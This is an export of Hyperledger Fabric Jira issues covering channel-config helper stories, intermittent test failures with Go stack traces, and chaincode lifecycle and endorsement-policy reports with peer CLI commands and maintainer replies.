 Starting with an existing Config block/transaction, I can call a function that removes an orderer endpoint from the configuration. After performing that operation, I can compute a ConfigUpdate transaction that is ready for a signature workflow. An appropriate example should also be added to the example test that demonstrates this behavior.",,caod,sykesm,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17591,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzyji",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,xwu,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Mar/20 12:20 AM;caod;[https://github.com/hyperledger/fabric/pull/887];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure in common/cluster/comm_test#TestMetrics: panic: runtime error: index out of range [0] with length 0,FAB-17593,44522,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,wenjian,wenjian,07/Mar/20 5:57 AM,31/Mar/20 10:09 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"{code}
2020-03-05T03:31:34.9115814Z    panic: runtime error: index out of range [0] with length 0
2020-03-05T03:31:34.9116030Z
2020-03-05T03:31:34.9116194Z goroutine 1242 [running]:
2020-03-05T03:31:34.9116434Z testing.tRunner.func1(0xc000225600)
2020-03-05T03:31:34.9116743Z    /opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:874 +0x69f
2020-03-05T03:31:34.9117041Z panic(0x1163840, 0xc0004cbca0)
2020-03-05T03:31:34.9117351Z    /opt/hostedtoolcache/go/1.13.8/x64/src/runtime/panic.go:679 +0x1b2
2020-03-05T03:31:34.9117799Z github.com/hyperledger/fabric/common/metrics/metricsfakes.(*Histogram).WithArgsForCall(0xc0000ca148, 0x0, 0x0, 0x0, 0x0)
2020-03-05T03:31:34.9118320Z    /home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/metrics/metricsfakes/histogram.go:95 +0x139
2020-03-05T03:31:34.9119126Z github.com/hyperledger/fabric/orderer/common/cluster_test.TestMetrics.func5(0xc000100000, 0xc000100580, 0xc0000c9c00)
2020-03-05T03:31:34.9119628Z    /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/comm_test.go:1208 +0xdc
2020-03-05T03:31:34.9120091Z github.com/hyperledger/fabric/orderer/common/cluster_test.TestMetrics.func7(0xc000225600)
2020-03-05T03:31:34.9120568Z    /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/comm_test.go:1276 +0x611
2020-03-05T03:31:34.9125696Z testing.tRunner(0xc000225600, 0xc000de0fa0)
2020-03-05T03:31:34.9127775Z    /opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:909 +0x19a
2020-03-05T03:31:34.9128802Z created by testing.(*T).Run
2020-03-05T03:31:34.9130740Z    /opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:960 +0x652

2020-03-05T03:31:34.9137355Z FAIL	github.com/hyperledger/fabric/orderer/common/cluster	19.013s
{code}",,sykesm,wenjian,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-14423,,,,,,,,,,,,,,,"31/Mar/20 10:09 PM;tsharris;TestMetrics03312020.log;https://jira.hyperledger.org/secure/attachment/18201/TestMetrics03312020.log","24/Mar/20 11:47 PM;sykesm;comm_test_03242020.log;https://jira.hyperledger.org/secure/attachment/18182/comm_test_03242020.log","07/Mar/20 5:58 AM;wenjian;ut_failure.log;https://jira.hyperledger.org/secure/attachment/18161/ut_failure.log",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019t7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wenjian,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Mar/20 5:58 AM;wenjian;CI build: https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=9281&view=logs&j=a11cdf60-0d11-5130-c801-1b4953009464;;;","19/Mar/20 8:33 AM;sykesm;The failure is likely due to concurrency issues. A callback function is supposed to fire the metric with two arguments but that callback didn't run. There *may* be some info in the log that explains why but I can't find the needle in the haystack.

There are also block of code like this on the path
{code}
	_, err = stream.operateWithTimeout(f)
{code}
where we get an error bug do nothing with it that make me scratch my head - especially as the caller can't return the error. Looks like we use a side-effect reference the error in a deferred function to ""debug"" log it. Gah... We have a synchronous call yet we rely on defer. We have an error yet we simply debug log it.

There is an error logged
{code}
2020-03-05T03:31:34.8237036Z [33m2020-03-05 03:30:52.157 UTC [orderer.common.cluster.step] Recv -> WARN 0ea[0m Stream 1 to (127.0.0.1:34503) was forcibly terminated because timeout (1s) expired
{code}
but it's hard to correlate that with anything. If it was related to the test that failed, then that might mean we're stuck in this block:
{code}
	select {
	case r := <-responseChan:
		if r.err != nil {
			stream.Cancel(r.err)
		}
		return r.res, r.err
	case <-timer.C:
		stream.Logger.Warningf(""Stream %d to %s(%s) was forcibly terminated because timeout (%v) expired"",
			stream.ID, stream.NodeName, stream.Endpoint, stream.Timeout)
		stream.Cancel(errTimeout)
		// Wait for the operation goroutine to end
		operationEnded.Wait()
		return nil, errTimeout
	}
{code}
where operationEnded.Wait is waiting for the go routine created to ""invoke"" the function responsible for updating the metric to complete.
 ;;;","20/Mar/20 6:55 AM;yacovm;{quote}2020-03-05T03:31:34.8237036Z [33m2020-03-05 03:30:52.157 UTC [orderer.common.cluster.step] Recv -> WARN 0ea[0m Stream 1 to (127.0.0.1:34503) was forcibly terminated because timeout (1s) expired
{quote}
 

This wasn't logged in this test. This test has a timeout of an hour, and also the *Configure()* method only receives a single node as input, while in the log it received two, so it belongs to another test.

It is printed from *TestAbortRPC*.

 ;;;","20/Mar/20 7:01 AM;yacovm;{quote}where we get an error bug do nothing with it that make me scratch my head - especially as the caller can't return the error. Looks like we use a side-effect reference the error in a deferred function to ""debug"" log it. Gah... We have a synchronous call yet we rely on defer. We have an error yet we simply debug log it.
{quote}
 

The caller doesn't return the error, but this error actually propagates to another place in the code where it is returned in future calls to *Send()* on the *Stream*.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Approveformyorg issue that only modified the --package-id option,FAB-17594,44523,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,KevinXiong1977,KevinXiong1977,08/Mar/20 10:34 PM,24/Mar/20 11:15 PM,28/Oct/23 3:09 AM,24/Mar/20 11:15 PM,v2.0.0,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"When an organization upgrades the chain code, if only the --package-id option is modified, no lifecycle chaincode commit is required, and no other organization needs to perform the lifecycle chaincode approveformyorg, which can be successfully upgraded independently.

+*docker ps*+
7e7bc42dbdcd dev-peer0.org1.example.com-{color:#FF0000}*abstore2-bd357a344acfaaee7ae4c3bbacc870b9bd7fe3c517d60ef034827c9a4ae1846f*{color}-e0fd9b7c79f89693d33d26de707e36d6bb42acb81a2ba6f9a05abd7ab99a1163 ""chaincode -peer.add..."" About an hour ago Up About an hour dev-peer0.org1.example.com-abstore2-bd357a344acfaaee7ae4c3bbacc870b9bd7fe3c517d60ef034827c9a4ae1846f

+*peer lifecycle chaincode queryinstalled --output json*+
 {
 ""installed_chaincodes"": [
 {
 ""package_id"": ""abstore2:bd357a344acfaaee7ae4c3bbacc870b9bd7fe3c517d60ef034827c9a4ae1846f"",
 ""label"": ""abstore2"",
 ""references"": {
 ""mychannel"":

{ ""chaincodes"": [ \{ ""name"": ""mycc"", ""version"": ""2.0"" }

]
 }
 }
 }
 ]
 }

 +*peer lifecycle chaincode package abstore3_go.tar.gz --path /root/go/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go --lang golang --label abstore3*+

 
 +*peer lifecycle chaincode install abstore3_go.tar.gz*+

 peer lifecycle chaincode queryinstalled --output json
 {
 ""installed_chaincodes"": [
 {
 ""package_id"": ""abstore2:bd357a344acfaaee7ae4c3bbacc870b9bd7fe3c517d60ef034827c9a4ae1846f"",
 ""label"": ""abstore2"",
 ""references"": {
 ""mychannel"": {
 ""chaincodes"": [

{ ""name"": ""mycc"", ""version"": ""2.0"" }

]
 }
 }
 },

{ ""package_id"": ""abstore3:32ba34dcece913081a5e2fd283b79d97f9d1e99edd04864253ce76af2fb1ff9e"", ""label"": ""abstore3"" }

]
 }

*{color:#FF0000}only the --package-id option is modified{color}*

 +*peer lifecycle chaincode approveformyorg --channelID mychannel --name mycc --version 2.0 --signature-policy ""AND('Org1MSP.member','Org2MSP.member')"" --init-required --package-id abstore3:32ba34dcece913081a5e2fd283b79d97f9d1e99edd04864253ce76af2fb1ff9e --sequence 3 --tls true --cafile $ORDERER_CA*+

peer lifecycle chaincode queryinstalled --output json
{
 ""installed_chaincodes"": [
 {
 ""package_id"": ""abstore3:32ba34dcece913081a5e2fd283b79d97f9d1e99edd04864253ce76af2fb1ff9e"",
 ""label"": ""abstore3"",
 ""references"": {
 ""mychannel"": {
 ""chaincodes"": [
 {
 ""name"": ""mycc"",
 ""version"": ""2.0""
 }
 ]
 }
 }
 },
{
 ""package_id"": ""abstore2:bd357a344acfaaee7ae4c3bbacc870b9bd7fe3c517d60ef034827c9a4ae1846f"",
 ""label"": ""abstore2""
 }
 ]
}

*{color:#FF0000}no lifecycle chaincode commit is required, and no other organization needs to perform the lifecycle chaincode approveformyorg, which can be successfully upgraded independently.{color}*

*+docker ps+*
d78257cdf37b dev-peer0.org1.example.com-{color:#FF0000}*abstore3-32ba34dcece913081a5e2fd283b79d97f9d1e99edd04864253ce76af2fb1ff9e*{color}-3bdb2174e7b647055e4eb71f336af1ba18f47d831085612136b9f392edff430d ""chaincode -peer.add..."" 37 seconds ago Up 36 seconds dev-peer0.org1.example.com-abstore3-32ba34dcece913081a5e2fd283b79d97f9d1e99edd04864253ce76af2fb1ff9e

 ",,denyeart,KevinXiong1977,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019tf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,KevinXiong1977,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Mar/20 7:35 PM;KevinXiong1977;[FAB-17441] approveformyorg should allow update of only package ID
https://github.com/hyperledger/fabric/pull/560;;;","11/Mar/20 6:37 PM;KevinXiong1977;My personal suggestion is that the following code in core/chaincode/lifecycle/lifecycle.go {color:#FF0000}*should only be executed when --package-id is empty*.{color}

func (ef *ExternalFunctions) ApproveChaincodeDefinitionForOrg(chname, ccname string, cd *ChaincodeDefinition, packageID string, publicState ReadableState, orgState ReadWritableState) error {

…………

// set the package id - whether empty or not. Setting
// an empty package ID means that the chaincode won't
// be invocable. The package might be set empty after
// the definition commits as a way of instructing the
// peers of an org no longer to endorse invocations
// for this chaincode 
if err := ef.Resources.Serializer.Serialize(ChaincodeSourcesName, privateName, &ChaincodeLocalPackage{
 PackageID: packageID,
}, orgState); err != nil {
 return errors.WithMessage(err, ""could not serialize chaincode package info to state"")
}

If we {color:#FF0000}*set --package-id to a non-null value*{color}, we need to add it in CommitChaincodeDefinition:

func (ef *ExternalFunctions) CommitChaincodeDefinition(chname, ccname string, cd *ChaincodeDefinition, publicState ReadWritableState, orgStates []OpaqueState) (map[string]bool, error) {
 approvals, err := ef.CheckCommitReadiness(chname, ccname, cd, publicState, orgStates)
 if err != nil {
 return nil, err
 }

 if err = ef.Resources.Serializer.Serialize(NamespacesName, ccname, cd, publicState); err != nil {
 return nil, errors.WithMessage(err, ""could not serialize chaincode definition"")
 }
// -----------------------------------------------

// ef.Resources.Serializer.Serialize(*ChaincodeSourcesName*, privateName, …………

// -----------------------------------------------


 return approvals, nil
}

 ;;;","19/Mar/20 1:16 PM;denyeart;[~KevinXiong1977]
Please update Description to clearly indicate difference between Expected Behavior and Current Behavior.
And please update first comment to indicate exactly how FAB-17441 is related.;;;","24/Mar/20 4:41 PM;KevinXiong1977;Hello, David,

1.Maybe I'm mistaken, it's not related to FAB-17441.

2. When Org1MSP and Org2MSP use ""AND ('Org1MSP.member', 'Org2MSP.member')"" as endorsement policie, they jointly deploy a contract fabcar ，assuming their package-id is ""AAAAAAAAAAAAAAA1"".

Org1MSP then unilaterally modified the chaincode and reinstalled the upgrade ，assuming his ackage-id is ""AAAAAAAAAAAAAAA2"".

Org1MSP then peer lifecycle chaincode approveformyorg --channelID mychannel --name fabcar --version 1.0 --signature-policy ""AND('Org1MSP.member','Org2MSP.member')"" --init-required *--package-id fabcar:AAAAAAAAAAAAAAA2 (only the --package-id option is modified)*  --sequence 1 --tls true --cafile $ORDERER_CA 

*{color:#FF0000}Expected Behavior:{color}*

Need to wait for Org2MSP to also perform approveformyorg operation on *--package-id fabcar:AAAAAAAAAAAAAAA2，*then Org1MSP and Org2MSP perform peer lifecycle chaincode commit together

 

{color:#FF0000}*Current Behavior：*{color}

In fact, no participation of Org2MSP is required, and the chaincode of Org1MSP upgrade installation can work normally.;;;","24/Mar/20 11:13 PM;denyeart;I believe this is working as expected.
Each organization can use different chaincode packages and update their packages unilaterally.
As long as the chaincode 'definition' (endorsement policies, etc) is the same, you don't need to get agreement again or re-commit the chaincode.
And as long as the different chaincode packages have the same executions results, transactions can still be endorsed across the different organizations (it is the execution 'results' that are critical to be consistent, not the chaincode per se).

See doc at:
https://hyperledger-fabric.readthedocs.io/en/latest/chaincode_lifecycle.html#organizations-install-different-chaincode-packages

[~KevinXiong1977]
I'll go ahead and close, but if you still think there is some problem with the code or the doc, please re-open.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Lifecycle chaincode issue under non-AND endorsement policy,FAB-17595,44524,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,KevinXiong1977,KevinXiong1977,09/Mar/20 1:09 PM,10/Mar/20 2:08 AM,28/Oct/23 3:09 AM,10/Mar/20 2:08 AM,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-peer,,,,,,,,,0,chaincode,,,,,"In Fabric 2.0, different versions of the chaincode package are allowed to be deployed on different peer nodes, including different chaincode development languages.
 When we are in the lifecycle chaincode under the *non-AND endorsement policy*, different peers may execute different business logic methods of the same chaincode.

{color:#ff0000}*Org1MSP*{color}

*+peer lifecycle chaincode package abstore1_go.tar.gz --path /root/go/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go --lang golang --label abstore1+*

+*peer lifecycle chaincode queryinstalled*+
 Installed chaincodes on peer:
 Package ID: abstore1:1e56a9b84ce52e75991b2ed9c8f61ec0f87e5a5f41737b4acf6a303eca4fee2c, Label: abstore1

+*peer lifecycle chaincode approveformyorg --channelID mychannel --name mycc --version 1.0 --signature-policy ""OR('Org1MSP.member','Org2MSP.member')"" --init-required --package-id abstore1:1e56a9b84ce52e75991b2ed9c8f61ec0f87e5a5f41737b4acf6a303eca4fee2c --sequence 1 --tls true --cafile $ORDERER_CA*+

{color:#ff0000}*Org2MSP*{color}

*vim /root/go/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go/abstore.go*

func (t *ABstore) invoke(stub shim.ChaincodeStubInterface, args []string) pb.Response

............

Aval = Aval - X  - X 
Bval = Bval + X + X

peer lifecycle chaincode package abstore1_go.tar.gz --path /root/go/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go --lang golang --label abstore1


peer lifecycle chaincode install abstore1_go.tar.gz


peer lifecycle chaincode queryinstalled

 Installed chaincodes on peer: Package ID: abstore1:1e56a9b84ce52e75991b2ed9c8f61ec0f87e5a5f41737b4acf6a303eca4fee2c, Label: abstore1 

*peer lifecycle chaincode approveformyorg* --channelID mychannel --name mycc --version 1.0 --signature-policy ""OR('Org1MSP.member','Org2MSP.member')"" --init-required --package-id abstore1:1e56a9b84ce52e75991b2ed9c8f61ec0f87e5a5f41737b4acf6a303eca4fee2c --sequence 1 --tls true --cafile $ORDERER_CA


*peer lifecycle chaincode commit* -o orderer1.example.com:7050 --channelID mychannel --name mycc --version 1.0 --sequence 1 --signature-policy ""OR('Org1MSP.member','Org2MSP.member')"" --init-required --tls true --cafile $ORDERER_CA --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles $ORG1_CA --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles $ORG2_CA


*peer chaincode invoke* -o orderer1.example.com:7050 --isInit --tls true --cafile $ORDERER_CA -C mychannel -n mycc --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles $ORG1_CA  --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles $ORG2_CA -c '\{""Args"":[""Init"",""a"",""1000"",""b"",""1000""]}' --waitForEvent

*Org1MSP*

peer chaincode query -C mychannel -n mycc -c '{""Args"":[""query"",""a""]}'
 1000

peer chaincode query -C mychannel -n mycc -c '{""Args"":[""query"",""b""]}'
 1000

{color:#ff0000}+When executing the chain code on Org1MSP, the amount is reduced by 100+{color}

*peer chaincode invoke* -o orderer1.example.com:7050 --tls true --cafile $ORDERER_CA -C mychannel -n mycc --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles $ORG1_CA  -c '{""Args"":[""invoke"",""a"",""b"",""100""]}' --waitForEvent

peer chaincode query -C mychannel -n mycc -c '{""Args"":[""query"",""a""]}'
 900

peer chaincode query -C mychannel -n mycc -c '{""Args"":[""query"",""b""]}'
 1100

*Org2MSP*

peer chaincode query -C mychannel -n mycc -c '{""Args"":[""query"",""a""]}'
 900

peer chaincode query -C mychannel -n mycc -c '{""Args"":[""query"",""b""]}'
 1100

+{color:#ff0000}When executing the chain code on Org2MSP, the amount is reduced *by 200*{color}+

*peer chaincode invoke* -o orderer1.example.com:7050 --tls true --cafile $ORDERER_CA -C mychannel -n mycc  --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles $ORG2_CA -c '{""Args"":[""invoke"",""a"",""b"",""100""]}' --waitForEvent

peer chaincode query -C mychannel -n mycc -c '{""Args"":[""query"",""a""]}'
 *{color:#ff0000}700{color}*

peer chaincode query -C mychannel -n mycc -c '{""Args"":[""query"",""b""]}'
 *{color:#ff0000}1300{color}*

Only when using the AND endorsement policy, the system will correctly report the error：

*peer chaincode invoke* -o orderer1.example.com:7050 --tls true --cafile $ORDERER_CA -C mychannel -n mycc --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles $ORG1_CA --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles $ORG2_CA -c '{""Args"":[""invoke"",""a"",""b"",""100""]}' --waitForEvent

{color:#ff0000}Error: could not assemble transaction: ProposalResponsePayloads do not match - proposal response: version:1 response:<status:200 > payload:""{color}

 

 

 ",,btl5037,KevinXiong1977,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019tn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,KevinXiong1977,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Mar/20 2:06 AM;btl5037;This is working as intended. The ability to instantiate different chaincodes on different peers isn't meant to allow you to provide different state altering logic (which is what you've done here). You've instantiated on an ""OR"" policy with only two members, so of course you can arrive a different result based on which peer the transaction is sent to. It's still up to the chaincode developers and network admin to write deterministic chaincode across peers and use a common sense endorsement policy;;;","10/Mar/20 2:08 AM;btl5037;Working as intended (per Jason);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove or rationalize config.Resources,FAB-17596,44526,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,10/Mar/20 1:05 AM,17/Mar/20 4:20 AM,28/Oct/23 3:09 AM,11/Mar/20 4:14 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,None of the config package code is using the Resources type in application.go. Do we actually need this type?,,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzya",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Mar/20 1:16 AM;caod;I talked to [~jyellick] about this and it looks like it's dead code so we can go ahead and remove it from our config package. There's a followup FAB-17597 for removing it in Fabric entirely;;;","10/Mar/20 2:39 AM;caod;[https://github.com/hyperledger/fabric/pull/818];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove Resources from genesisconfig types,FAB-17597,44527,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,10/Mar/20 1:15 AM,08/Apr/20 10:18 PM,28/Oct/23 3:09 AM,08/Apr/20 10:18 PM,,,,,,,,,,,,,,fabric-common,,,,,,,,,0,ipm,,,,,"Seems like the Resources type is part of dead code that is no longer used in the configtx. Let's go ahead and remove it entirely

/cc [~jyellick]",,caod,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzz",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,dereckluo,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Apr/20 6:22 AM;dereckluo;https://github.com/hyperledger/fabric/pull/1009;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Performance of Large Consortium,FAB-17598,44528,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,10/Mar/20 3:13 AM,11/Jan/21 1:38 AM,28/Oct/23 3:09 AM,11/Jan/21 1:38 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,fabric-test-scenario,,,,,"Scale a network to a large number of members (say 50) each with two peers.

The endorsement policy is `OutOf(2, member1, member2, ....., memberN)`

Does validation performance suffer at all as the consortium grows to a larger number of members and peers",,btl5037,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0192i:r4",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Apr/20 3:01 PM;Senthil1;Yes, it does. Though we need to collect only 2 endorsements out of 50 organizations, the matching of the signature set to the endorsement policy is an NP-hard problem. When the search space increases, the performance would go down. 

Please refer to slide 22 here – http://www.bchainledger.com/2020/03/performance-analysis-of-hyperledger.html;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Record Barebones Transaction Information in Remote DB,FAB-17599,44529,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,10/Mar/20 3:30 AM,11/Jan/21 2:37 AM,28/Oct/23 3:09 AM,11/Jan/21 2:37 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"So we can monitor the performance metrics of the Barebones network for performance regression, we need to record the transaction metrics in a DB. PTE should publish the results when done. We can use a DB in the IBM cloud. Results should be published in a format that can be consumed by Grafana to create time series chart to show the trend over the last `x` number of days.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0192i:r2",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement helper function for retrieving policies for a specific org from an existing config,FAB-17600,44530,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,10/Mar/20 5:22 AM,17/Mar/20 4:22 AM,28/Oct/23 3:09 AM,13/Mar/20 3:42 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to retrieve existing policies for an organization without manually parsing the config transaction.

 

*Acceptance*

I should be able to call a function for retrieving policies for a specific org (regardless of application/orderer/consortium org). The example test should also be updated to demonstrate usage of this helper.",,caod,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17576,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzygy",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,dereckluo,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Mar/20 12:33 AM;dereckluo;https://github.com/hyperledger/fabric/pull/824;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent test failure in pvtdata integration tests - collections_config7 with default maxPeerCount and requiredPeerCount,FAB-17601,44533,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,wenjian,sykesm,sykesm,11/Mar/20 2:35 AM,24/Mar/20 11:21 PM,28/Oct/23 3:09 AM,24/Mar/20 10:51 PM,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-ledger,,,,,,,,,0,ci-flake,,,,,"Test flake encountered while running locally on 6 CPU VM.

{code}
terminated)                                                   
• Failure [42.710 seconds]                                                                                                                                                               
PrivateData Dissemination when pulling is disabled when collection config does not have maxPeerCount or requiredPeerCount [It] disseminates private data per collections_config7 with default maxPeerCount and requiredPeerCount                                                                                                                                                 
/home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/integration/pvtdata/pvtdata_test.go:146                                                                                  
                                                                                                                                                                                         
  Expected                                                                                                                                                                               
      <int>: 2                                                                                                                                                                           
  to equal                                                                                                                                                                               
      <int>: 1                                                                                                                                                                           
                                                                                                                                                                                         
  /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/integration/pvtdata/pvtdata_test.go:1294
{code}

Looks like this test was added relatively recently as part of FAB-17303.

Logs to be attached momentarily.
